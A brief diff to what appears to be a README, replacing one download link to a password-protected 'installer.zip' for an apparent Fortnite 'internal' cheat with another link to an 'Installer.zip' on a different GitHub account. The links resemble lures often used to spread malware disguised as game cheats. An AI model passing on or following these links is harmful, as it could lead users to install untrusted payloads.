@@ -1,5 +1,4 @@
-# [DOWNLOAD LINK](https://github.com/winch4kocouckocou/Fortnite-Internal/releases/download/Download/installer.zip)
-# PASSWORD : 2025
+ [DOWNLOAD LINK](https://github.com/bow-coverbang/installerz/releases/download/install/Installer.zip) 
 
 
 
